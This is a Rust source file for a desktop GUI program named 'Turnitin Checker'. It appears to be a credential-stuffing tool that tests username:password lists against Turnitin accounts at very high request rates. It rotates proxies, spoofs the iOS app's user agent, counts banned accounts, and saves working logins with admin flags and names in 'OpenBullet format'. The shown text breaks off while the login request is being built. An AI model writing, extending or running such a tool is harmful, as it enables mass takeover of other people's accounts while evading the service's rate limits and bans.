use anyhow::{Context, Result};
use base64::{engine::general_purpose, Engine as _};
use crossbeam::channel;
use eframe::{egui, emath::Align, epaint::Color32};
use egui_plot::{Line, Plot, PlotPoints};
use native_dialog::FileDialog;
use num_cpus;
use reqwest::{
    header::{HeaderMap, HeaderValue, ACCEPT, ACCEPT_ENCODING, ACCEPT_LANGUAGE, AUTHORIZATION,
             CONNECTION, HOST},
    Client,
};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::{
    fs::File,
    io::{self, BufRead, BufReader, Write},
    sync::{Arc, Mutex},
    time::{Duration, Instant},
    collections::VecDeque,
};
use thiserror::Error;
use tokio::runtime::Runtime;
use chrono;
use rand;
use once_cell::sync::Lazy;

const DEFAULT_TIMEOUT_SECONDS: u64 = 10;
const MAX_RETRY_DELAY_MS: u64 = 5000;
const DEFAULT_CONCURRENT_REQUESTS: u32 = 2000;
const DEFAULT_REQUESTS_PER_SECOND: u32 = 500;
const APP_NAME: &str = "Turnitin Checker";
const APP_VERSION: &str = "1.1.0";
const RATE_WINDOW_SIZE: usize = 30;

thread_local! {
    static IS_RUNNING: std::cell::RefCell<bool> = std::cell::RefCell::new(false);
    static SHARED_STATS: std::cell::RefCell<Option<Arc<Mutex<PerformanceStats>>>> = std::cell::RefCell::new(None);
}

static LAST_REQUEST_TIMES: Lazy<Mutex<VecDeque<Instant>>> = Lazy::new(|| Mutex::new(VecDeque::with_capacity(1000)));

fn track_request() {
    let now = Instant::now();
    if let Ok(mut times) = LAST_REQUEST_TIMES.lock() {
        while times.len() > 5000 {
            times.pop_front();
        }
        times.push_back(now);
    }
}

#[derive(Debug, Clone)]
struct PerformanceStats {
    total_processed: usize,
    success_count: usize,
    failed_count: usize,
    banned_count: usize,
    retry_count: usize,
    error_count: usize,
    progress: f32,
    current_rps: f32,
    average_rps: f32,
    peak_rps: f32,
    uptime_seconds: u64,
    start_time: Option<Instant>,
    requests_timeline: VecDeque<(f32, usize)>,
}

impl Default for PerformanceStats {
    fn default() -> Self {
        Self {
            total_processed: 0,
            success_count: 0,
            failed_count: 0,
            banned_count: 0,
            retry_count: 0,
            error_count: 0,
            progress: 0.0,
            current_rps: 0.0,
            average_rps: 0.0,
            peak_rps: 0.0,
            uptime_seconds: 0,
            start_time: None,
            requests_timeline: VecDeque::with_capacity(RATE_WINDOW_SIZE),
        }
    }
}

#[derive(Debug, Clone)]
struct Credential {
    username: String,
    password: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct TurnitinResult {
    username: String,
    password: String,
    status: String,
    is_admin: Option<String>,
    default_user_type: Option<String>,
    first_name: Option<String>,
    last_name: Option<String>,
    timestamp: Option<String>,
}

#[derive(Debug, Error)]
enum AppError {
    #[error("Network error: {0}")]
    NetworkError(#[from] reqwest::Error),
    
    #[error("IO error: {0}")]
    IoError(#[from] io::Error),
    
    #[error("Parse error: {0}")]
    ParseError(String),
    
    #[error("Account banned")]
    Banned,
    
    #[error("Authentication failed")]
    AuthFailed,
    
    #[error("Rate limited - retry later")]
    RateLimited,
    
    #[error("Header value error: {0}")]
    HeaderValueError(#[from] reqwest::header::InvalidHeaderValue),
}

// GUI Application
#[derive(Clone)]
#[allow(dead_code)]
struct TurnitinApp {
    credentials_path: Option<String>,
    output_path: Option<String>,
    threads: u32,
    max_retries: u32,
    retry_delay: u32,  
    status_text: String,
    results: Vec<TurnitinResult>,
    running: bool,
    
    progress: Option<f32>,
    total_processed: usize,
    total_credentials: usize,
    success_count: usize,
    failed_count: usize,
    banned_count: usize,
    retry_count: usize,
    error_count: usize,
    high_performance_mode: bool,
    
    performance: Arc<Mutex<PerformanceStats>>,
    
    estimated_completion_time: Option<String>,
    last_successful_check: Option<String>,
    
    requests_per_second: u32,
    concurrent_requests: u32,
    
    continuous_save: bool,
    
    show_advanced: bool,
    dark_mode: bool,
    show_charts: bool,
    
    use_proxies: bool,
    proxy_path: Option<String>,
}

impl Default for TurnitinApp {
    fn default() -> Self {
        let cpu_count = num_cpus::get();
        let default_threads = if cpu_count > 1 { cpu_count - 1 } else { 1 };
        
        Self {
            credentials_path: None,
            output_path: None,
            threads: default_threads as u32,
            max_retries: 3,
            retry_delay: 1000,
            status_text: "Ready to start".to_string(),
            results: Vec::new(),
            running: false,
            
            progress: None,
            total_processed: 0,
            total_credentials: 0,
            success_count: 0,
            failed_count: 0,
            banned_count: 0,
            retry_count: 0,
            error_count: 0,
            high_performance_mode: false,
            
            performance: Arc::new(Mutex::new(PerformanceStats::default())),
            
            estimated_completion_time: None,
            last_successful_check: None,
            
            requests_per_second: DEFAULT_REQUESTS_PER_SECOND,
            concurrent_requests: DEFAULT_CONCURRENT_REQUESTS,
            
            continuous_save: true,
            
            show_advanced: false,
            dark_mode: false,
            show_charts: true,
            
            use_proxies: false,
            proxy_path: None,
        }
    }
}

impl eframe::App for TurnitinApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        if self.running {
            ctx.request_repaint_after(Duration::from_millis(100));
        }
        
        SHARED_STATS.with(|stats| {
            if let Some(stats_ref) = &*stats.borrow() {
                if let Ok(stats_data) = stats_ref.try_lock() {
                    self.performance = Arc::new(Mutex::new(stats_data.clone()));
                    
                    if let Some(start_time) = stats_data.start_time {
                        if stats_data.progress > 0.01 && stats_data.progress < 0.99 {
                            let elapsed = start_time.elapsed().as_secs_f64();
                            let total_estimated = elapsed / stats_data.progress as f64;
                            let remaining_secs = total_estimated - elapsed;
                            
                            if remaining_secs > 0.0 {
                                let remaining_mins = (remaining_secs / 60.0).floor();
                                let remaining_secs = remaining_secs % 60.0;
                                
                                self.estimated_completion_time = Some(format!(
                                    "{:.0} min {:.0} sec remaining", 
                                    remaining_mins, 
                                    remaining_secs
                                ));
                            }
                        }
                    }
                }
            }
        });
        
        IS_RUNNING.with(|is_running| {
            if *is_running.borrow() != self.running {
                self.running = *is_running.borrow();
                if !self.running {
                    self.status_text = "Completed".to_string();
                }
            }
        });
        
        if self.dark_mode {
            ctx.set_visuals(egui::Visuals::dark());
        } else {
            ctx.set_visuals(egui::Visuals::light());
        }
        
        egui::CentralPanel::default().show(ctx, |ui| {
            ui.horizontal(|ui| {
                ui.heading(format!("{} v{}", APP_NAME, APP_VERSION));
                
                ui.with_layout(egui::Layout::right_to_left(Align::Center), |ui| {
                    // Dark mode toggle
                    ui.checkbox(&mut self.dark_mode, "🌙 Dark Mode");
                });
            });
            
            egui::TopBottomPanel::top("file_selection").show_inside(ui, |ui| {
                ui.horizontal(|ui| {
                    ui.label("Credentials File:");
                    if let Some(path) = &self.credentials_path {
                        ui.label(path);
                    } else {
                        ui.label("No file selected");
                    }
                    if ui.button("Browse").clicked() && !self.running {
                        if let Some(path) = FileDialog::new()
                            .add_filter("Text Files", &["txt"])
                            .show_open_single_file()
                            .unwrap_or(None)
                        {
                            self.credentials_path = Some(path.to_string_lossy().to_string());
                        }
                    }
                });
                
                ui.horizontal(|ui| {
                    ui.label("Output Folder:");
                    if let Some(path) = &self.output_path {
                        ui.label(path);
                    } else {
                        ui.label("No folder selected");
                    }
                    if ui.button("Browse").clicked() && !self.running {
                        if let Some(path) = FileDialog::new()
                            .show_open_single_dir()
                            .unwrap_or(None)
                        {
                            self.output_path = Some(path.to_string_lossy().to_string());
                        }
                    }
                });
                
                ui.checkbox(&mut self.continuous_save, "Save results as they're found")
                    .on_hover_text("Continuously save successful results to output file as they're discovered");
                
                if self.show_advanced {
                    ui.horizontal(|ui| {
                        ui.checkbox(&mut self.use_proxies, "Use Proxies");
                        
                        if self.use_proxies {
                            if let Some(path) = &self.proxy_path {
                                ui.label(path);
                            } else {
                                ui.label("No proxy list selected");
                            }
                            
                            if ui.button("Browse").clicked() && !self.running {
                                if let Some(path) = FileDialog::new()
                                    .add_filter("Text Files", &["txt"])
                                    .show_open_single_file()
                                    .unwrap_or(None)
                                {
                                    self.proxy_path = Some(path.to_string_lossy().to_string());
                                }
                            }
                        }
                    });
                }
            });
            
            egui::TopBottomPanel::top("settings").show_inside(ui, |ui| {
                ui.collapsing("Settings", |ui| {
                    ui.horizontal(|ui| {
                        ui.label("Threads:");
                        ui.add(egui::DragValue::new(&mut self.threads).clamp_range(1..=1024));
                        
                        ui.separator();
                        
                        ui.label("Requests/sec:");
                        ui.add(egui::DragValue::new(&mut self.requests_per_second).clamp_range(1..=5000));
                        
                        ui.separator();
                        
                        ui.label("Max Retries:");
                        ui.add(egui::DragValue::new(&mut self.max_retries).clamp_range(0..=10));
                        
                        ui.separator();
                        
                        ui.label("Retry Delay (ms):");
                        ui.add(egui::DragValue::new(&mut self.retry_delay).clamp_range(100..=10000));
                        
                        ui.checkbox(&mut self.show_advanced, "Advanced");
                    });
                    
                    if self.show_advanced {
                        ui.horizontal(|ui| {
                            ui.label("Concurrent Requests:");
                            ui.add(egui::DragValue::new(&mut self.concurrent_requests).clamp_range(50..=10000))
                                .on_hover_text("Maximum number of concurrent requests. Higher values use more memory.");
                                
                            if !self.running {
                                if ui.button("🚀 Max Performance").clicked() {
                                    // Set aggressive performance settings
                                    self.threads = num_cpus::get() as u32 * 2;
                                    self.requests_per_second = 2000;
                                    self.concurrent_requests = 5000;
                                    self.retry_delay = 500;
                                }
                                
                                if ui.button("⚖️ Balanced").clicked() {
                                    // Set balanced settings
                                    self.threads = num_cpus::get() as u32;
                                    self.requests_per_second = 500;
                                    self.concurrent_requests = 2000;
                                    self.retry_delay = 1000;
                                }
                            }
                        });
                        
                        ui.checkbox(&mut self.show_charts, "Show performance charts")
                            .on_hover_text("Display performance charts in the statistics panel");
                    }
                });
            });
            
            if self.running {
                ui.horizontal(|ui| {
                    if ui.button("⏹ Stop").clicked() {
                        self.running = false;
                        self.status_text = "Stopped".to_string();
                        IS_RUNNING.with(|is_running| {
                            *is_running.borrow_mut() = false;
                        });
                    }
                    
                    if let Ok(perf) = self.performance.try_lock() {
                        ui.add(egui::ProgressBar::new(perf.progress).show_percentage());
                        
                        if let Some(time) = &self.estimated_completion_time {
                            ui.label(time);
                        }
                    }
                    
                    ui.label(&self.status_text);
                });
            } else {
                if ui.button("▶️ Start").clicked() && 
                   self.credentials_path.is_some() && self.output_path.is_some() &&
                   (!self.use_proxies || self.proxy_path.is_some()) {
                    self.running = true;
                    self.status_text = "Starting...".to_string();
                    
                    let performance = Arc::new(Mutex::new(PerformanceStats::default()));
                    self.performance = performance.clone();
                    
                    // Count total credentials to process for accurate progress tracking
                    let mut total_credentials = 0;
                    if let Some(credentials_path) = &self.credentials_path {
                        if let Ok(file) = File::open(credentials_path) {
                            let reader = BufReader::new(file);
                            total_credentials = reader.lines().count();
                        }
                    }
                    
                    SHARED_STATS.with(|stats| {
                        *stats.borrow_mut() = Some(performance.clone());
                    });
                    
                    IS_RUNNING.with(|is_running| {
                        *is_running.borrow_mut() = true;
                    });
                    
                    let credentials_path = self.credentials_path.clone().unwrap();
                    let output_path = self.output_path.clone().unwrap();
                    let threads = self.threads;
                    let max_retries = self.max_retries;
                    let retry_delay = self.retry_delay;
                    let requests_per_second = self.requests_per_second;
                    let high_performance_mode = self.show_advanced;
                    let concurrent_requests = self.concurrent_requests;
                    let continuous_save = self.continuous_save;
                    let use_proxies = self.use_proxies;
                    let proxy_path = self.proxy_path.clone();
                    
                    let timestamp = chrono::Local::now().format("%Y-%m-%d_%H-%M-%S").to_string();
                    let output_dir = format!("{}/turnitin_results_{}", output_path, timestamp);
                    
                    if let Err(e) = std::fs::create_dir_all(&output_dir) {
                        eprintln!("Error creating output directory: {}", e);
                        self.status_text = format!("Error: {}", e);
                        self.running = false;
                        IS_RUNNING.with(|is_running| {
                            *is_running.borrow_mut() = false;
                        });
                        return;
                    }
                    
                    let output_dir_clone = output_dir.clone();
                    
                    let app_handle = ctx.clone();
                    
                    tokio::spawn(async move {
                        match run_checker(
                            &credentials_path, 
                            threads as usize, 
                            max_retries as usize,
                            retry_delay as u64,
                            requests_per_second as usize,
                            concurrent_requests as usize,
                            high_performance_mode,
                            &performance,
                            &output_dir_clone,
                            continuous_save,
                            total_credentials,
                            use_proxies,
                            proxy_path,
                        ).await {
                            Ok(results) => {
                                // Final save of results (if continuous save was off)
                                if !continuous_save {
                                    eprintln!("Processing complete with {} results", results.len());
                                    let output_file = format!("{}/successful_results.txt", output_dir_clone);
                                    if let Err(e) = save_results_to_csv(&results, &output_file) {
                                        eprintln!("Error saving results: {}", e);
                                    }
                                }
                            },
                            Err(e) => {
                                eprintln!("Error running checker: {}", e);
                            }
                        }
                        
                        IS_RUNNING.with(|is_running| {
                            *is_running.borrow_mut() = false;
                        });
                        
                        app_handle.request_repaint();
                    });
                }
            }
            
            ui.separator();
            
            egui::CollapsingHeader::new("Statistics")
                .default_open(true)
                .show(ui, |ui| {
                    if let Ok(perf) = self.performance.try_lock() {
                        ui.horizontal(|ui| {
                            ui.vertical(|ui| {
                                ui.label(format!("Total processed: {}", perf.total_processed));
                                ui.label(format!("Success: {}", perf.success_count));
                                ui.label(format!("Failed: {}", perf.failed_count));
                            });
                            
                            ui.vertical(|ui| {
                                ui.label(format!("Banned: {}", perf.banned_count));
                                ui.label(format!("Retries: {}", perf.retry_count));
                                ui.label(format!("Errors: {}", perf.error_count));
                            });
                            
                            ui.vertical(|ui| {
                                ui.label(format!("Current RPS: {:.1}", perf.current_rps));
                                ui.label(format!("Average RPS: {:.1}", perf.average_rps));
                                ui.label(format!("Peak RPS: {:.1}", perf.peak_rps));
                            });
                            
                            if perf.total_processed > 0 {
                                let success_rate = (perf.success_count as f32 / perf.total_processed as f32) * 100.0;
                                
                                ui.vertical(|ui| {
                                    ui.label(format!("Success rate: {:.1}%", success_rate));
                                    
                                    let success_progress = perf.success_count as f32 / perf.total_processed as f32;
                                    ui.add(egui::ProgressBar::new(success_progress)
                                        .text(format!("{:.1}%", success_rate))
                                        .fill(Color32::from_rgb(50, 200, 100)));
                                    
                                    if let Some(start_time) = perf.start_time {
                                        let uptime = start_time.elapsed();
                                        ui.label(format!("Uptime: {:02}:{:02}:{:02}", 
                                            uptime.as_secs() / 3600,
                                            (uptime.as_secs() % 3600) / 60,
                                            uptime.as_secs() % 60));
                                    }
                                });
                            }
                        });
                        
                        if self.show_charts && !perf.requests_timeline.is_empty() && perf.requests_timeline.len() > 1 {
                            ui.separator();
                            
                            Plot::new("rps_plot")
                                .height(100.0)
                                .allow_zoom(false)
                                .allow_drag(false)
                                .show(ui, |plot_ui| {
                                    let mut points = Vec::new();
                                    let timeline = &perf.requests_timeline;
                                    
                                    for i in 1..timeline.len() {
                                        let (prev_time, prev_count) = timeline[i-1];
                                        let (curr_time, curr_count) = timeline[i];
                                        
                                        let time_diff = curr_time - prev_time;
                                        if time_diff > 0.0 {
                                            let rps = (curr_count - prev_count) as f32 / time_diff;
                                            points.push([curr_time as f64, rps as f64]);
                                        }
                                    }
                                    
                                    if !points.is_empty() {
                                        plot_ui.line(Line::new(
                                            PlotPoints::from_iter(points.iter().copied())
                                        ).color(Color32::from_rgb(46, 189, 89)).name("Requests/sec"));
                                    }
                                });
                        }
                    }
                });
                
            ui.separator();
            
            if !self.results.is_empty() {
                ui.heading("Recent Results:");
                egui::ScrollArea::vertical().show(ui, |ui| {
                    egui::Grid::new("results_grid")
                        .striped(true)
                        .spacing([10.0, 4.0])
                        .show(ui, |ui| {
                            ui.strong("Credential");
                            ui.strong("Status");
                            ui.strong("Profile Data");
                            ui.end_row();
                            
                            let results_to_show = self.results.iter().rev().take(50);
                            
                            for result in results_to_show {
                                // Display credential
                                ui.label(format!("{}:{}", result.username, result.password));
                                
                                // Display status with appropriate color
                                let status_color = match result.status.as_str() {
                                    "SUCCESS" => Color32::GREEN,
                                    "FAIL" => Color32::RED,
                                    "BAN" => Color32::YELLOW,
                                    _ => Color32::GRAY,
                                };
                                ui.label(egui::RichText::new(&result.status).color(status_color));
                                
                                // Display profile data in OpenBullet format
                                if result.status == "SUCCESS" {
                                    let is_admin = result.is_admin.as_deref().unwrap_or("").trim_matches('"');
                                    let default_user_type = result.default_user_type.as_deref().unwrap_or("").trim_matches('"');
                                    let first_name = result.first_name.as_deref().unwrap_or("");
                                    let last_name = result.last_name.as_deref().unwrap_or("");
                                    
                                    let profile = format!(
                                        "Is_Admin = {} | default_user_type = {} | FirstName = {} | LastName = {}",
                                        is_admin,
                                        default_user_type,
                                        first_name,
                                        last_name
                                    );
                                    ui.label(profile);
                                } else {
                                    ui.label("-");
                                }
                                
                                ui.end_row();
                            }
                        });
                });
            }
        });
    }
}

async fn run_checker(
    credentials_path: &str, 
    thread_count: usize, 
    max_retries: usize, 
    retry_delay: u64, 
    requests_per_second: usize,
    concurrent_requests: usize,
    high_performance_mode: bool,
    stats: &Arc<Mutex<PerformanceStats>>,
    output_dir: &str,
    continuous_save: bool,
    _total_credentials: usize,
    use_proxies: bool,
    proxy_path: Option<String>,
) -> Result<Vec<TurnitinResult>> {
    {
        let mut perf = stats.lock().unwrap();
        perf.start_time = Some(Instant::now());
    }

    let file = File::open(credentials_path).context("Failed to open credentials file")?;
    let reader = BufReader::new(file);
    
    let credentials: Vec<Credential> = reader
        .lines()
        .filter_map(|line| {
            line.ok().and_then(|line| {
                let parts: Vec<&str> = line.split(':').collect();
                if parts.len() >= 1 {
                    let username = parts[0].trim().to_string();
                    let password = if parts.len() >= 2 {
                        parts[1].trim().to_string()
                    } else {
                        "".to_string()
                    };
                    
                    Some(Credential {
                        username,
                        password,
                    })
                } else {
                    None
                }
            })
        })
        .collect();
    
    if credentials.is_empty() {
        return Err(anyhow::anyhow!("No valid credentials found"));
    }
    
    println!("Processing {} credentials using {} threads", credentials.len(), thread_count);
    
    let (sender, receiver): (channel::Sender<TurnitinResult>, channel::Receiver<TurnitinResult>) = channel::unbounded();
    let results = Arc::new(Mutex::new(Vec::new()));
    
    let output_file = format!("{}/successful_results.txt", output_dir);
    
    let continuous_file = if continuous_save {
        match std::fs::File::create(&output_file) {
            Ok(file) => {
                let buf_writer = std::io::BufWriter::new(file);
                Some(Arc::new(Mutex::new(buf_writer)))
            },
            Err(e) => {
                eprintln!("Error creating output file for continuous save: {}", e);
                None
            }
        }
    } else {
        None
    };
    
    let proxies = if use_proxies {
        if let Some(proxy_path) = proxy_path.as_ref() {
            match load_proxies(proxy_path) {
                Ok(p) => {
                    println!("Loaded {} proxies", p.len());
                    p
                },
                Err(e) => {
                    eprintln!("Error loading proxies: {}", e);
                    Vec::new()
                }
            }
        } else {
            Vec::new()
        }
    } else {
        Vec::new()
    };
    
    let proxies = Arc::new(proxies);
    
    let rate_limiter = Arc::new(tokio::sync::Semaphore::new(requests_per_second));
    let concurrency_limiter = Arc::new(tokio::sync::Semaphore::new(concurrent_requests));
    
    let results_clone = results.clone();
    let credential_count = credentials.len();
    let stats_clone = stats.clone();
    let continuous_file_clone = continuous_file.clone();
    
    let receiver_handle = std::thread::spawn(move || {
        let mut completed = 0;
        let total = credential_count;
        
        while let Ok(result) = receiver.recv() {
            let mut perf = stats_clone.lock().unwrap();
            
            match result.status.as_str() {
                "SUCCESS" => { 
                    perf.success_count += 1; 
                    
                    if let Some(file) = &continuous_file_clone {
                        if let Ok(mut writer) = file.lock() {
                            let is_admin = result.is_admin.as_deref().unwrap_or("").trim_matches('"');
                            let default_user_type = result.default_user_type.as_deref().unwrap_or("").trim_matches('"');
                            let first_name = result.first_name.as_deref().unwrap_or("");
                            let last_name = result.last_name.as_deref().unwrap_or("");
                            
                            let output_line = format!(
                                "{}:{} | Is_Admin = {} | default_user_type = {} | FirstName = {} | LastName = {}\n",
                                result.username,
                                result.password,
                                is_admin,
                                default_user_type,
                                first_name,
                                last_name
                            );
                            let _ = writer.write_all(output_line.as_bytes());
                            let _ = writer.flush();
                            
                            println!("{}", output_line.trim());
                        }
                    }
                },
                "FAIL" => { perf.failed_count += 1; },
                "BAN" => { perf.banned_count += 1; },
                "RETRY" => { perf.retry_count += 1; },
                _ => { perf.error_count += 1; },
            }
            
            results_clone.lock().unwrap().push(result);
            completed += 1;
            perf.total_processed = completed;
            perf.progress = completed as f32 / total as f32;
            
            if let Some(start_time) = perf.start_time {
                let elapsed = start_time.elapsed().as_secs_f32();
                if elapsed > 0.0 {
                    perf.average_rps = completed as f32 / elapsed;
                    perf.uptime_seconds = elapsed as u64;
                    
                    if let Ok(times) = LAST_REQUEST_TIMES.lock() {
                        let now = Instant::now();
                        let recent_count = times.iter()
                            .filter(|&t| now.duration_since(*t) < Duration::from_secs(1))
                            .count();
                        perf.current_rps = recent_count as f32;
                        
                        // Update peak RPS if needed
                        if perf.current_rps > perf.peak_rps {
                            perf.peak_rps = perf.current_rps;
                        }
                    }
                    
                    // Update requests timeline for charting (every 1 second)
                    if perf.requests_timeline.is_empty() || 
                       elapsed - perf.requests_timeline.back().unwrap_or(&(0.0, 0)).0 >= 1.0 {
                        perf.requests_timeline.push_back((elapsed, completed));
                        
                        // Keep only the last RATE_WINDOW_SIZE entries
                        while perf.requests_timeline.len() > RATE_WINDOW_SIZE {
                            perf.requests_timeline.pop_front();
                        }
                    }
                }
            }
            
            if completed % 10 == 0 || completed == total {
                println!("Progress: {}/{} ({}%)", completed, total, completed * 100 / total);
            }
            
            if completed >= total {
                println!("All credentials processed");
                break;
            }
        }
    });
    
    let proxy_index = Arc::new(Mutex::new(0));
    
    if high_performance_mode {
        let (cred_sender, cred_receiver) = tokio::sync::mpsc::channel::<Credential>(concurrent_requests);
        
        let num_consumers = thread_count * 2;
        let mut worker_handles = Vec::with_capacity(num_consumers);
        
        let cred_receiver = Arc::new(tokio::sync::Mutex::new(cred_receiver));
        for _ in 0..num_consumers {
            let sender_clone = sender.clone();
            let rate_limiter_clone = rate_limiter.clone();
            let concurrency_limiter_clone = concurrency_limiter.clone();
            let max_retries_clone = max_retries;
            let retry_delay_clone = retry_delay;
            let receiver = cred_receiver.clone();
            let proxies_clone = proxies.clone();
            let proxy_index_clone = proxy_index.clone();
            let use_proxies = use_proxies;
            
            let worker_handle = tokio::spawn(async move {
                loop {
                    let credential = {
                        let mut receiver_guard = receiver.lock().await;
                        match receiver_guard.recv().await {
                            Some(cred) => cred,
                            None => break, // Channel closed, exit loop
                        }
                    };
                    
                    let _rate_permit = rate_limiter_clone.acquire().await.unwrap();
                    let _concurrency_permit = concurrency_limiter_clone.acquire().await.unwrap();
                    
                    let proxy = if use_proxies && !proxies_clone.is_empty() {
                        let mut idx = proxy_index_clone.lock().unwrap();
                        *idx = (*idx + 1) % proxies_clone.len();
                        Some(proxies_clone[*idx].clone())
                    } else {
                        None
                    };
                    
                    track_request();
                    
                    let result = process_credential_with_retry(&credential, max_retries_clone, retry_delay_clone, proxy).await;
                    sender_clone.send(result).unwrap();
                }
            });
            
            worker_handles.push(worker_handle);
        }
        
        let mut sent = 0;
        let total = credentials.len();
        
        let chunk_size = 5000;
        for chunk in credentials.chunks(chunk_size) {
            for credential in chunk {
                if let Err(_) = cred_sender.send(credential.clone()).await {
                    break;
                }
                
                sent += 1;
                if sent % 1000 == 0 {
                    println!("Sent {}/{} credentials to workers", sent, total);
                }
            }
        }
        
        drop(cred_sender);
        
        for handle in worker_handles {
            let _ = handle.await;
        }
    } else {
        let mut task_handles = Vec::with_capacity(credentials.len());
        
        for credential in credentials {
            let sender = sender.clone();
            let rate_limiter = rate_limiter.clone();
            let concurrency_limiter = concurrency_limiter.clone();
            let max_retries = max_retries;
            let retry_delay = retry_delay;
            let proxies_clone = proxies.clone();
            let proxy_index_clone = proxy_index.clone();
            let use_proxies = use_proxies;
            
            let handle = tokio::spawn(async move {
                let _rate_permit = rate_limiter.acquire().await.unwrap();
                let _concurrency_permit = concurrency_limiter.acquire().await.unwrap();
                
                let proxy = if use_proxies && !proxies_clone.is_empty() {
                    let mut idx = proxy_index_clone.lock().unwrap();
                    *idx = (*idx + 1) % proxies_clone.len();
                    Some(proxies_clone[*idx].clone())
                } else {
                    None
                };
                
                track_request();
                
                let result = process_credential_with_retry(&credential, max_retries, retry_delay, proxy).await;
                sender.send(result).unwrap();
            });
            
            task_handles.push(handle);
        }
        
        // Wait for all tasks to complete
        for handle in task_handles {
            let _ = handle.await;
        }
    }
    
    drop(sender);
    
    receiver_handle.join().unwrap();
    
    let final_results = results.lock().unwrap().clone();
    println!("Final results count: {}", final_results.len());
    Ok(final_results)
}

fn load_proxies(proxy_path: &str) -> Result<Vec<String>> {
    let file = File::open(proxy_path).context("Failed to open proxy file")?;
    let reader = BufReader::new(file);
    
    let proxies: Vec<String> = reader
        .lines()
        .filter_map(|line| line.ok())
        .filter(|line| !line.trim().is_empty())
        .collect();
    
    if proxies.is_empty() {
        return Err(anyhow::anyhow!("No valid proxies found"));
    }
    
    Ok(proxies)
}

async fn process_credential_with_retry(
    credential: &Credential, 
    max_retries: usize,
    retry_delay: u64,
    proxy: Option<String>
) -> TurnitinResult {
    let mut result = TurnitinResult {
        username: credential.username.clone(),
        password: credential.password.clone(),
        status: "UNKNOWN".to_string(),
        is_admin: None,
        default_user_type: None,
        first_name: None,
        last_name: None,
        timestamp: Some(chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string()),
    };
    
    let mut retry_count = 0;
    
    // Use exponential backoff for retries
    let mut current_delay = retry_delay;
    
    loop {
        match check_turnitin_credential(credential, proxy.as_deref()).await {
            Ok((status, profile_data)) => {
                result.status = status;
                
                if let Some(data) = profile_data {
                    if let Value::Object(map) = data {
                        if let Some(is_admin) = map.get("is_admin") {
                            if let Some(value) = is_admin.as_str() {
                                result.is_admin = Some(value.to_string());
                            } else {
                                result.is_admin = Some(is_admin.to_string().trim_matches('"').to_string());
                            }
                        }
                        
                        if let Some(user_type) = map.get("default_user_type") {
                            if let Some(value) = user_type.as_str() {
                                result.default_user_type = Some(value.to_string());
                            } else {
                                result.default_user_type = Some(user_type.to_string().trim_matches('"').to_string());
                            }
                        }
                        
                        if let Some(first_name) = map.get("first_name") {
                            if let Some(value) = first_name.as_str() {
                                result.first_name = Some(value.to_string());
                            } else {
                                result.first_name = Some(first_name.to_string().trim_matches('"').to_string());
                            }
                        }
                        
                        if let Some(last_name) = map.get("last_name") {
                            if let Some(value) = last_name.as_str() {
                                result.last_name = Some(value.to_string());
                            } else {
                                result.last_name = Some(last_name.to_string().trim_matches('"').to_string());
                            }
                        }
                    }
                }
                
                #[cfg(debug_assertions)]
                println!("Extracted profile data for {}: is_admin={:?}, user_type={:?}, first_name={:?}, last_name={:?}",
                    credential.username,
                    result.is_admin,
                    result.default_user_type,
                    result.first_name,
                    result.last_name
                );
                
                break;
            }
            Err(e) => {
                let should_retry = match e {
                    AppError::NetworkError(ref err) if err.is_timeout() => true,
                    AppError::NetworkError(_) | AppError::RateLimited => retry_count < max_retries,
                    AppError::AuthFailed | AppError::Banned => false,
                    _ => retry_count < max_retries,
                };
                
                if should_retry {
                    retry_count += 1;
                    
                    #[cfg(debug_assertions)]
                    {
                        let retry_limit_str = if let AppError::NetworkError(ref err) = e {
                            if err.is_timeout() {
                                "∞".to_string()
                            } else {
                                format!("{}", max_retries)
                            }
                        } else {
                            format!("{}", max_retries)
                        };
                        
                        eprintln!("Retrying {} (attempt {}/{}): {}", 
                            credential.username, retry_count, retry_limit_str, e);
                    }
                    
                    let jitter = (rand::random::<f64>() * 0.3 + 0.85) * current_delay as f64;
                    tokio::time::sleep(Duration::from_millis(jitter as u64)).await;
                    current_delay = (current_delay * 2).min(MAX_RETRY_DELAY_MS); // Cap at configured max
                    continue;
                }
                
                #[cfg(debug_assertions)]
                eprintln!("Error processing {}: {}", credential.username, e);
                
                result.status = match e {
                    AppError::AuthFailed => "FAIL".to_string(),
                    AppError::Banned => "BAN".to_string(),
                    AppError::RateLimited => "RETRY".to_string(),
                    _ => "ERROR".to_string(),
                };
                
                break;
            }
        }
    }
    
    result
}

fn extract_value(input: &str, left_delim: &str, right_delim: &str) -> Option<String> {
    if let Some(start_pos) = input.find(left_delim) {
        let start = start_pos + left_delim.len();
        if let Some(end_pos) = input[start..].find(right_delim) {
            let value = input[start..start + end_pos].trim().to_string();
            
            let cleaned_value = value.trim_matches('"').to_string();
            
            #[cfg(debug_assertions)]
            println!("Extracted '{}' between '{}' and '{}'", cleaned_value, left_delim, right_delim);
            
            return Some(cleaned_value);
        } else {
            let remainder = input[start..].trim().to_string();
            
            #[cfg(debug_assertions)]
            println!("Found start '{}' but no end '{}', returning remainder: {}", 
                    left_delim, right_delim, remainder);
            
            if !remainder.is_empty() {
                return Some(remainder.trim_matches('"').to_string());
            }
        }
    }
    
    #[cfg(debug_assertions)]
    println!("Failed to extract value between '{}' and '{}'", left_delim, right_delim);
    
    None
}

async fn check_turnitin_credential(credential: &Credential, proxy: Option<&str>) -> Result<(String, Option<Value>), AppError> {
    let auth_str = format!("{}:{}", credential.username, credential.password);
    let encoded = general_purpose::STANDARD.encode(auth_str.as_bytes());
    
    let mut client_builder = Client::builder()
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECONDS))
        .gzip(true)
        .use_rustls_tls() // Use rustls instead of native-tls for better performance
        .tcp_keepalive(Some(Duration::from_secs(15)))
        .pool_max_idle_per_host(100) // Increase connection pool size
        .user_agent("Turnitin/1433 CFNetwork/1494.0.7 Darwin/23.4.0");
    
    if let Some(proxy_url) = proxy {
        if let Ok(proxy) = reqwest::Proxy::all(proxy_url) {
            client_builder = client_builder.proxy(proxy);
        }
    }
    
    let client = client_builder.build()?;
    
    let mut headers = HeaderMap::new();
    headers.insert(ACCEPT, HeaderValue::from_static("application/json"));
    headers.insert(ACCEPT_ENCODING, HeaderValue::from_static("gzip"));
    headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static("en-AU,en;q=0.9"));
    headers.insert(
        AUTHORIZATION,
        HeaderValue::from_str(&format!("Basic {}", encoded))?,
    );
